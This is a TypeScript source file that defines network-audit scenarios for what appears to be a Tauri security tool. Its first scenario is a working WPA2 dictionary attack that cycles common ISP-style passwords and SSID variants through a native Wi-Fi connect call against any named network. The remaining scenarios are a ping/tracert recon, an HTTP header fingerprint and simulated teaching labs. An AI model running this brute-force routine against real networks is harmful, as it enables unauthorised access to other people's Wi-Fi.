// src/core/logic/externalAuditScenarios.ts

import { invoke } from "@tauri-apps/api/core"; // O la teva importació de 'invoke'
import type { DeviceDTO, ExternalAuditRequestDTO, HostIdentity } from "../../shared/dtos/NetworkDTOs";

// 1. Ampliem els modes per incloure 'native'
export type ScenarioMode = "external" | "simulated" | "native";

export type ScenarioSupport = {
  supported: boolean;
  reason?: string;
};

export type SimStep = {
  delayMs: number;
  stream: "stdout" | "stderr";
  line: string;
};

// Contexto para ejecución nativa + Señal de Abortar
export type NativeExecutionContext = {
  target: string;
  onLog: (stream: "stdout" | "stderr", line: string) => void;
  signal?: AbortSignal; // <--- NUEVO: Para poder cancelar
};

export type ExternalAuditScenario = {
  id: string;
  title: string;
  description: string;
  mode: ScenarioMode;
  category: "ROUTER" | "DEVICE" | "WIFI" | "IOT" | "EDU";

  // CLI (Mode External)
  buildRequest?: (ctx: { device: DeviceDTO; identity: HostIdentity | null }) => ExternalAuditRequestDTO;

  // Simulation (Mode Simulated)
  simulate?: (ctx: { device: DeviceDTO; identity: HostIdentity | null }) => SimStep[];

  // RUST (Mode Native) - NOU
  executeNative?: (ctx: NativeExecutionContext) => Promise<void>;

  isSupported?: (ctx: { device: DeviceDTO; identity: HostIdentity | null }) => ScenarioSupport;
};

const isWindows = () => navigator.userAgent.toLowerCase().includes("windows");

const isGateway = (device: DeviceDTO, identity: HostIdentity | null) => {
  if (device.isGateway) return true;
  if (identity?.gatewayIp && device.ip === identity.gatewayIp) return true;
  return false;
};

export const getExternalAuditScenarios = (): ExternalAuditScenario[] => {
  return [
    // --- ESCENARIO WIFI ---
    {
      id: "wifi_brute_force_dict",
      title: "WIFI: Attack (Dictionary)",
      description: "Ataque activo de diccionario contra WPA2. Desconecta la red actual para probar credenciales.",
      mode: "native",
      category: "WIFI",
      isSupported: () => ({ supported: true }),
      executeNative: async ({ target, onLog, signal }) => {
        const ssid = target;
        onLog("stdout", `⚔️ INICIANDO SECUENCIA DE ATAQUE contra: [ ${ssid} ]`);
        onLog("stdout", "⚠️ AVISO: La conexión a internet se interrumpirá durante el ataque.");

        const dictionary = [
          "12345678", "123456789", "1234567890",
          "password", "contraseña", "admin1234",
          "vodafone1234", "movistar1234", "orange1234",
          "fibra1234", "internet", "qwertyuiop", "admin", "12345"
        ];

        // Variaciones simples
        dictionary.push(ssid);
        dictionary.push(ssid + "123");
        dictionary.push(ssid + "2024");
        dictionary.push(ssid + "2025");

        onLog("stdout", `📚 Diccionario cargado: ${dictionary.length} vectores.`);
        onLog("stdout", "------------------------------------------------");

        for (const pass of dictionary) {
          // 1. COMPROBAR CANCELACIÓN
          if (signal?.aborted) {
            onLog("stderr", "🛑 ATAQUE ABORTADO POR EL USUARIO.");
            onLog("stdout", "♻️ Intentando restaurar estado del adaptador...");
            break;
          }

          onLog("stdout", `🔑 Probando: ${pass}`);

          try {
            const success = await invoke<boolean>("wifi_connect", { ssid, password: pass });

            if (success) {
              onLog("stdout", "------------------------------------------------");
              onLog("stdout", `🔓 PREDATOR HIT! PASSWORD ENCONTRADA: [ ${pass} ]`);
              onLog("stdout", `✅ Conectado exitosamente a ${ssid}.`);
              return;
            } else {
              onLog("stderr", `❌ Fallo auth: ${pass}`);
            }
          } catch (e) {
            onLog("stderr", `⚠️ Error driver: ${e}`);
          }

          // Delay para no saturar la tarjeta wifi y permitir que Windows respire
          await new Promise(r => setTimeout(r, 1500));
        }

        if (!signal?.aborted) {
          onLog("stderr", "💀 DICCIONARIO AGOTADO. Ataque fallido.");
        }

        onLog("stdout", "------------------------------------------------");
        onLog("stdout", "ℹ️ NOTA: Windows intentará reconectar a tu red habitual automáticamente.");
      }
    },

    // --- ESCENARIS EXISTENTS ---
    {
      id: "router_recon_ping_tracert",
      title: "Router: Recon basico (PING + TRACERT)",
      description:
        "Ejecuta un reconocimiento basico no intrusivo contra el router: latencia (ping) y ruta (tracert).",
      mode: "external",
      category: "ROUTER",
      isSupported: () => {
        if (!isWindows()) return { supported: false, reason: "Preset pensado para Windows. Usa modo CUSTOM en otros SO." };
        return { supported: true };
      },
      buildRequest: ({ device }) => {
        const ip = device.ip;
        return {
          binaryPath: "powershell.exe",
          args: [
            "-NoProfile",
            "-Command",
            `Write-Output "== PING =="; ping -n 4 ${ip}; Write-Output ""; Write-Output "== TRACERT =="; tracert -d ${ip}`,
          ],
          timeoutMs: 180000,
        };
      },
    },
    {
      id: "device_http_headers",
      title: "HTTP: Fingerprint de cabeceras (HEAD)",
      description:
        "Obtiene cabeceras HTTP (sin credenciales) para inventario y hardening (por ejemplo Server, WWW-Authenticate, etc.).",
      mode: "external",
      category: "DEVICE",
      isSupported: () => {
        if (!isWindows()) return { supported: false, reason: "Preset pensado para Windows. Usa modo CUSTOM en otros SO." };
        return { supported: true };
      },
      buildRequest: ({ device }) => {
        const ip = device.ip;
        return {
          binaryPath: "powershell.exe",
          args: [
            "-NoProfile",
            "-Command",
            `try { (Invoke-WebRequest -UseBasicParsing -Method Head -TimeoutSec 5 -Uri http://${ip}/).Headers | Format-List * } catch { Write-Error $_ }`,
          ],
          timeoutMs: 60000,
        };
      },
    },
    {
      id: "edu_pmkid_exposure_sim",
      title: "WiFi: PMKID (exposicion) [SIMULADO]",
      description:
        "Simulacion didactica: explica el concepto de PMKID (client-less) y como mitigarlo. No ejecuta ataques real.",
      mode: "simulated",
      category: "WIFI",
      simulate: ({ device, identity }) => {
        const gw = identity?.gatewayIp || "<gateway>";
        const target = isGateway(device, identity) ? "router/gateway" : "AP cercano";
        return [
          { delayMs: 0, stream: "stdout", line: `LAB: PMKID (SIMULADO) sobre ${target}` },
          { delayMs: 250, stream: "stdout", line: `Contexto: IP=${device.ip} GW=${gw}` },
          { delayMs: 500, stream: "stdout", line: "Modelo: en routers vulnerables, ciertos flujos pueden exponer material derivado (PMKID)." },
          { delayMs: 1100, stream: "stdout", line: "Mitigacion: WPA3-Personal (SAE), PMF/802.11w habilitado." },
        ];
      },
    },
    {
      id: "edu_iot_risk_profile",
      title: "IoT: Perfilado de riesgo por vendor/OUI [SIMULADO]",
      description:
        "Simulacion didactica: usa el vendor detectado para explicar riesgo tipico IoT.",
      mode: "simulated",
      category: "IOT",
      simulate: ({ device }) => {
        const vendor = (device.vendor || "Unknown").trim();
        const label = vendor && vendor.toLowerCase() !== "unknown" ? vendor : device.mac;
        return [
          { delayMs: 0, stream: "stdout", line: `LAB: IoT Risk Profile (SIMULADO) sobre ${label}` },
          { delayMs: 250, stream: "stdout", line: `Target: IP=${device.ip} MAC=${device.mac}` },
          { delayMs: 600, stream: "stdout", line: "Heuristica: vendors IoT suelen tener ciclos de parcheo mas lentos." },
          { delayMs: 900, stream: "stdout", line: "Mitigacion: segmentar en VLAN/SSID IoT." },
        ];
      },
    },
  ];
};